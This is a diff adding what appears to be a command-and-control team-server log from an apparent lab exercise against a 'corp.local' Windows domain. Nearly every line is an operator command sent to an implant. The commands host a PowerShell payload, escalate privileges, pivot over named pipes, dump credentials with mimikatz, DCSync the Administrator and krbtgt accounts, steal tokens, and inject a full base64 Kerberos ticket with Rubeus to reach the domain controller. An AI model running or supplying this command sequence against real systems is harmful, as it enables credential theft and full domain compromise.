@@ -1,0 +1,81 @@
+17/05/2023 01:28:23 | Info | User | Fropops-6272173e-b5b6-43a2-9242-9097e539ca68 |  | Exit TeamServer
+17/05/2023 01:29:06 | Info | Agent | fa89fda319 |  | Agent Checking In
+17/05/2023 01:29:26 | Info | User | Fropops-c4961626-6683-4909-80b5-44b80e4eeb54 |  | Connexion to TeamServer
+17/05/2023 01:29:27 | Info | User | Fropops-c4961626-6683-4909-80b5-44b80e4eeb54 |  | Connexion to TeamServer
+17/05/2023 01:30:24 | Info | User | Fropops-c4961626-6683-4909-80b5-44b80e4eeb54 |  | Exit TeamServer
+17/05/2023 01:31:46 | Info | Agent | fa89fda319 |  | Agent Checking In
+17/05/2023 01:31:54 | Info | User | Fropops-f623549a-9f67-4a2c-88ba-00a8a32094ea |  | Connexion to TeamServer
+17/05/2023 01:31:56 | Info | User | Fropops-f623549a-9f67-4a2c-88ba-00a8a32094ea |  | Connexion to TeamServer
+17/05/2023 01:32:22 | Info | User | Fropops-f623549a-9f67-4a2c-88ba-00a8a32094ea |  | Web hosting z - Payload PowerShell x64 https://192.168.56.129:443
+17/05/2023 01:32:32 | Info | User | Fropops-f623549a-9f67-4a2c-88ba-00a8a32094ea |  | Exit TeamServer
+17/05/2023 01:34:40 | Info | User | Fropops-2f436236-cada-4a5a-98af-d1b4bf13dd7d |  | Connexion to TeamServer
+17/05/2023 01:34:41 | Info | User | Fropops-2f436236-cada-4a5a-98af-d1b4bf13dd7d |  | Connexion to TeamServer
+17/05/2023 01:35:36 | Info | Agent | 1ce49e9619 |  | Agent Checking In
+17/05/2023 01:36:00 | Info | User | Fropops-2f436236-cada-4a5a-98af-d1b4bf13dd7d | 1ce49e9619 | Command tasked to agent : shell whoami
+17/05/2023 01:36:07 | Info | User | Fropops-2f436236-cada-4a5a-98af-d1b4bf13dd7d | 1ce49e9619 | Command tasked to agent : shell whoami /priv
+17/05/2023 01:36:18 | Info | User | Fropops-2f436236-cada-4a5a-98af-d1b4bf13dd7d | 1ce49e9619 | Command tasked to agent : run whoami /priv
+17/05/2023 01:36:48 | Info | User | Fropops-2f436236-cada-4a5a-98af-d1b4bf13dd7d | 1ce49e9619 | Command tasked to agent : run c:\windows\system32\whoami.exe /priv
+17/05/2023 01:36:54 | Info | User | Fropops-2f436236-cada-4a5a-98af-d1b4bf13dd7d | 1ce49e9619 | Command tasked to agent : run c:\windows\system32\whoami.exe
+17/05/2023 01:37:29 | Info | User | Fropops-2f436236-cada-4a5a-98af-d1b4bf13dd7d | 1ce49e9619 | Command tasked to agent : execute-assembly /mnt/Share/Utils/win/AD/Rubeus.exe triage
+17/05/2023 01:39:29 | Info | User | Fropops-2f436236-cada-4a5a-98af-d1b4bf13dd7d |  | Exit TeamServer
+17/05/2023 01:39:40 | Info | User | Fropops-4a7d3342-a349-42af-b0b4-a119c45c62a2 |  | Connexion to TeamServer
+17/05/2023 01:39:41 | Info | User | Fropops-4a7d3342-a349-42af-b0b4-a119c45c62a2 |  | Connexion to TeamServer
+17/05/2023 01:40:01 | Info | User | Fropops-4a7d3342-a349-42af-b0b4-a119c45c62a2 | 1ce49e9619 | Command tasked to agent : execute-assembly /mnt/Share/Utils/win/AD/Rubeus.exe triage
+17/05/2023 01:40:11 | Info | User | Fropops-4a7d3342-a349-42af-b0b4-a119c45c62a2 | 1ce49e9619 | Command tasked to agent : ps
+17/05/2023 01:40:55 | Info | User | Fropops-4a7d3342-a349-42af-b0b4-a119c45c62a2 | 1ce49e9619 | Command tasked to agent : elevate -p c:\users\fcastle -i -f installTool
+17/05/2023 01:41:57 | Info | User | Fropops-4a7d3342-a349-42af-b0b4-a119c45c62a2 | 1ce49e9619 | Command tasked to agent : terminate
+17/05/2023 01:42:02 | Info | User | Fropops-4a7d3342-a349-42af-b0b4-a119c45c62a2 | fa89fda319 | Command tasked to agent : terminate
+17/05/2023 01:45:03 | Info | User | Fropops-4a7d3342-a349-42af-b0b4-a119c45c62a2 |  | Exit TeamServer
+17/05/2023 01:45:28 | Info | User | Fropops-8a4ad143-c61d-4cdb-97f7-41d7469ea259 |  | Connexion to TeamServer
+17/05/2023 01:45:30 | Info | User | Fropops-8a4ad143-c61d-4cdb-97f7-41d7469ea259 |  | Connexion to TeamServer
+17/05/2023 01:45:46 | Info | User | Fropops-8a4ad143-c61d-4cdb-97f7-41d7469ea259 |  | Web hosting z - Payload PowerShell x64 https://192.168.56.129:443
+17/05/2023 01:46:29 | Info | Agent | a877dac2c1 |  | Agent Checking In
+17/05/2023 01:46:51 | Info | User | Fropops-8a4ad143-c61d-4cdb-97f7-41d7469ea259 | a877dac2c1 | Command tasked to agent : elevate -p c:\users\fcastle -i -f installTool
+17/05/2023 01:48:07 | Info | User | Fropops-8a4ad143-c61d-4cdb-97f7-41d7469ea259 | a877dac2c1 | Command tasked to agent : elevate -p c:\users\fcastle -i -f installTool
+17/05/2023 01:50:48 | Info | User | Fropops-8a4ad143-c61d-4cdb-97f7-41d7469ea259 | a877dac2c1 | Command tasked to agent : elevate -p c:\users\fcastle -i -f installTool
+17/05/2023 01:53:06 | Info | User | Fropops-8a4ad143-c61d-4cdb-97f7-41d7469ea259 | a877dac2c1 | Command tasked to agent : elevate -p c:\users\fcastle -f installTool
+17/05/2023 01:53:41 | Info | User | Fropops-8a4ad143-c61d-4cdb-97f7-41d7469ea259 | a877dac2c1 | Command tasked to agent : pivot show
+17/05/2023 01:56:40 | Info | Agent | 0ca8f53aed |  | Agent Checking In
+17/05/2023 08:03:24 | Info | User | Fropops-279315c6-5a92-486b-ad6d-3bd12bd4c617 |  | Connexion to TeamServer
+17/05/2023 08:03:27 | Info | User | Fropops-279315c6-5a92-486b-ad6d-3bd12bd4c617 |  | Connexion to TeamServer
+17/05/2023 08:03:29 | Info | Agent | 36e3a5abed |  | Agent Checking In
+17/05/2023 08:03:48 | Info | User | Fropops-279315c6-5a92-486b-ad6d-3bd12bd4c617 | 36e3a5abed | Command tasked to agent : pivot start -b pipe://127.0.0.1:local
+17/05/2023 08:04:21 | Info | User | Fropops-279315c6-5a92-486b-ad6d-3bd12bd4c617 | 36e3a5abed | Command tasked to agent : shell dir \\.\pipe\
+17/05/2023 08:05:21 | Info | User | Fropops-279315c6-5a92-486b-ad6d-3bd12bd4c617 | 36e3a5abed | Command tasked to agent : powershell get-childitem \\.\pipe\
+17/05/2023 08:07:00 | Info | User | Fropops-279315c6-5a92-486b-ad6d-3bd12bd4c617 | 36e3a5abed | Command tasked to agent : pivot stop -b pipe://127.0.0.1:local
+17/05/2023 08:07:12 | Info | User | Fropops-279315c6-5a92-486b-ad6d-3bd12bd4c617 | 36e3a5abed | Command tasked to agent : pivot show
+17/05/2023 08:07:23 | Info | User | Fropops-279315c6-5a92-486b-ad6d-3bd12bd4c617 | 36e3a5abed | Command tasked to agent : pivot start -b pipe://127.0.0.1:local
+17/05/2023 08:08:35 | Info | Agent | 73a2217070 |  | Agent Checking In
+17/05/2023 08:09:21 | Info | Agent | 3b6f72cb2a |  | Agent Checking In
+17/05/2023 02:24:04 | Info | Agent | 2f7b69618d |  | Agent Checking In
+17/05/2023 02:26:38 | Info | Agent | 29b26a076a |  | Agent Checking In
+17/05/2023 02:28:29 | Info | Agent | 3dbcd399f2 |  | Agent Checking In
+17/05/2023 02:28:49 | Info | User | Fropops-8a4ad143-c61d-4cdb-97f7-41d7469ea259 | 3dbcd399f2 | Command tasked to agent : execute-assembly /mnt/Share/Utils/win/AD/Rubeus.exe triage
+17/05/2023 02:28:59 | Info | User | Fropops-8a4ad143-c61d-4cdb-97f7-41d7469ea259 | 3dbcd399f2 | Command tasked to agent : ps
+17/05/2023 02:29:23 | Info | User | Fropops-8a4ad143-c61d-4cdb-97f7-41d7469ea259 | 3dbcd399f2 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "privilege::debug" "sekurlsa::logonpasswords" exit
+17/05/2023 02:33:06 | Info | Agent | b758f56b06 |  | Agent Checking In
+17/05/2023 02:33:17 | Info | User | Fropops-8a4ad143-c61d-4cdb-97f7-41d7469ea259 | b758f56b06 | Command tasked to agent : terminate
+17/05/2023 02:33:34 | Info | Agent | 601f5486d3 |  | Agent Checking In
+17/05/2023 02:33:57 | Info | User | Fropops-8a4ad143-c61d-4cdb-97f7-41d7469ea259 | 601f5486d3 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "privilege::debug" "sekurlsa::logonpasswords" exit
+17/05/2023 02:34:35 | Info | User | Fropops-8a4ad143-c61d-4cdb-97f7-41d7469ea259 | 601f5486d3 | Command tasked to agent : terminate
+17/05/2023 02:35:20 | Info | Agent | f188c58eee |  | Agent Checking In
+17/05/2023 02:35:25 | Info | User | Fropops-8a4ad143-c61d-4cdb-97f7-41d7469ea259 | f188c58eee | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "privilege::debug" "sekurlsa::logonpasswords" exit
+17/05/2023 02:35:48 | Info | User | Fropops-8a4ad143-c61d-4cdb-97f7-41d7469ea259 | f188c58eee | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "lsadump::dcsync /domain:corp.local /user:Administrator" exit
+17/05/2023 02:36:40 | Info | User | Fropops-8a4ad143-c61d-4cdb-97f7-41d7469ea259 | f188c58eee | Command tasked to agent : steal-token 9680
+17/05/2023 02:36:48 | Info | User | Fropops-8a4ad143-c61d-4cdb-97f7-41d7469ea259 | f188c58eee | Command tasked to agent : shell whoami
+17/05/2023 02:36:59 | Info | User | Fropops-8a4ad143-c61d-4cdb-97f7-41d7469ea259 | f188c58eee | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "lsadump::dcsync /domain:corp.local /user:Administrator" exit
+17/05/2023 02:37:47 | Info | User | Fropops-8a4ad143-c61d-4cdb-97f7-41d7469ea259 | f188c58eee | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
+17/05/2023 02:39:19 | Info | User | Fropops-8a4ad143-c61d-4cdb-97f7-41d7469ea259 | f188c58eee | Command tasked to agent : revert-self
+17/05/2023 02:39:23 | Info | User | Fropops-8a4ad143-c61d-4cdb-97f7-41d7469ea259 | f188c58eee | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
+17/05/2023 02:39:49 | Info | User | Fropops-8a4ad143-c61d-4cdb-97f7-41d7469ea259 | f188c58eee | Command tasked to agent : execute-assembly /mnt/Share/Utils/win/AD/Rubeus.exe triage
+17/05/2023 02:40:41 | Info | User | Fropops-8a4ad143-c61d-4cdb-97f7-41d7469ea259 | f188c58eee | Command tasked to agent : execute-assembly /mnt/Share/Utils/win/AD/Rubeus.exe dump /luid:0x4de827 /service:krbtgt /nowrap
+17/05/2023 02:41:09 | Info | User | Fropops-8a4ad143-c61d-4cdb-97f7-41d7469ea259 | f188c58eee | Command tasked to agent : execute-assembly /mnt/Share/Utils/win/AD/Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CORP /username:Administrator /password:FakePass /ticket:doIF0DCCBcygAwIBBaEDAgEWooIE1jCCBNJhggTOMIIEyqADAgEFoQwbCkNPUlAuTE9DQUyiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkNPUlAuTE9DQUyjggSSMIIEjqADAgESoQMCAQKiggSABIIEfDSxUKpSXFktiXWJP28MWbSkargkw/CgTMPyq+hF19rIMECGNIdP3smR4TeCcQdrt847j+4QZdd3t30boypAHqbsEP/bXAx8pSwSULuCjj7EbxkQx3qNLQNa6dpuR421ctJDNLSkTXbfsKNBtwwpFNkQNZtGUfdwfGaKcqv49VuZLcCoGx2akCKEIk3mdmk+CuzenHwGhXO3ltn9tpLJ1thx7v5+j2D+atdZfVVaqR6NMhi+WX93Y+ojBHGKVAPjSmpzMih0IZnQ+H2ufMaF6N7T8JEc3oTb4NzoVB/KxgI+8dwMo0mP9loYcqjQDS9Caf3Z6sg5KJ5pQJpWXNF3nhDRve4L/chNOCAa7pMYIPtJs8JjHmFvIbEtUb6zghJ2h1tgCBkryLCo3dsLHV8M1RdKewgO2WGkjRf6B5kIrQz1lQdGP1HIviO4xRWa0yP7X2R3LHlyIsF5iaL1QhpVJfVkav/iXegI7xfSzR8BX5jDmQB/cevpfX2HLitDJtfRRVHgZe5EGte4ZUlsXzCEjFR9EDGF5dYhv+6JkZzPXqck5372uLuyrYJhqWfy6zBU0gQXfD1elckhrQ6fhRaJwY9ZQ1FWmXNW9Vo9NnrQ1PL55ngPk6K56o0FSY02wO3dJRw+pK9SO4GmzuVkn2VpRSwrKbomyj5NUavvdBYNtdSOIuZwpkTiSv1LATqba12rZGvkdImT6siQT1P8T4fZ/GijRdKaDvZl4UqsXlfE5gvjt7tzKFe6LEbzvhvRx4AZoQnGGom1uEAs8KTHP44IASH5d6+bbQVeQAqc8wlREvwRmH0RzCnr+B07WFftV6+7HqSU54A7Hrz6Dzs1NfXcyJXKvYbMte+TukHwej3MyfRMm5GD9PJ3lLAglTw4m/YxljafrqItYkpiXf19Zr2zCq2msANLdPYy4MCYRRVBL7x7N7TIszyWNs9xdqbSGqIfkLKWlrlkbJzTk43kgWkJ+M0WEdC45OoT/TMAE5QlcPkLpH4IGk8fFZVIusaN1In/6oaRLVKRu2wYa+Fh7A5vGEJNsyqq2wVt9GuPlk16k+nU28x70/XaC/Me/GgYtORvUpG1/CFbBe9js7HVU69/511CI/Mwg0TUhdSSy77S941KqKQDLK+ZQEiTkcD2b8oFWz+BWUZabouzpEeirw9iwEwS7qKCr/NkwHTbPFOohRKnQrevTcNpl8FeHqpsmpw05+D3V4/MAFayhI1aFzuY/Svf956XK3Thl7Do8ngnym/gTLyxRnU9XZl9DZPvgdqMSe9laa06Wzs1DSej4J+MaYGX2ZCl8o4wKpZM1pDwQybbnQcZ0A/jMwPRA1ruXoU9orv/D36H3N6BY5tPBlylkhufzpN8Nn2o4x4cbZepjF57RwVLkG46cn8a9lxH6PJlY5Yr26Bj2NumcwxdZ+ztV/sQi5vApGHxiUdZPgx2CCVgYbpAhNOvAvQ/40//M6h6ZEU0U63+ctbfkH84REQD2DLclglgKJfQ6ecSvRnqUIDjH3nYrPikgct9qxCmo4HlMIHioAMCAQCigdoEgdd9gdQwgdGggc4wgcswgcigKzApoAMCARKhIgQgJCPLqjOdDZhm9u9APpbpJSQv04NWiyQ8Y12HYC7A/3ChDBsKQ09SUC5MT0NBTKIaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3KjBwMFAEDhAAClERgPMjAyMzA1MTcwNTI4MTVaphEYDzIwMjMwNTE3MTUyODE1WqcRGA8yMDIzMDUyNDA1MjgxNVqoDBsKQ09SUC5MT0NBTKkfMB2gAwIBAqEWMBQbBmtyYnRndBsKQ09SUC5MT0NBTA==
+17/05/2023 02:42:09 | Info | User | Fropops-8a4ad143-c61d-4cdb-97f7-41d7469ea259 | f188c58eee | Command tasked to agent : steal-token 4588
+17/05/2023 02:42:40 | Info | User | Fropops-8a4ad143-c61d-4cdb-97f7-41d7469ea259 | f188c58eee | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
+17/05/2023 02:45:42 | Info | User | Fropops-8a4ad143-c61d-4cdb-97f7-41d7469ea259 | f188c58eee | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz/x64/mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
+17/05/2023 02:48:01 | Info | User | Fropops-8a4ad143-c61d-4cdb-97f7-41d7469ea259 | f188c58eee | Command tasked to agent : terminate
+17/05/2023 02:50:02 | Info | Agent | 4b37b2c628 |  | Agent Checking In
+17/05/2023 02:50:12 | Info | User | Fropops-8a4ad143-c61d-4cdb-97f7-41d7469ea259 | 4b37b2c628 | Command tasked to agent : steal-token 4588
+17/05/2023 02:50:32 | Info | User | Fropops-8a4ad143-c61d-4cdb-97f7-41d7469ea259 | 4b37b2c628 | Command tasked to agent : shell dir \\dc-corp.corp.local\c$
+17/05/2023 02:50:42 | Info | User | Fropops-8a4ad143-c61d-4cdb-97f7-41d7469ea259 | 4b37b2c628 | Command tasked to agent : shell dir \\corp-dc.corp.local\c$
+17/05/2023 02:50:56 | Info | User | Fropops-8a4ad143-c61d-4cdb-97f7-41d7469ea259 |  | Exit TeamServer
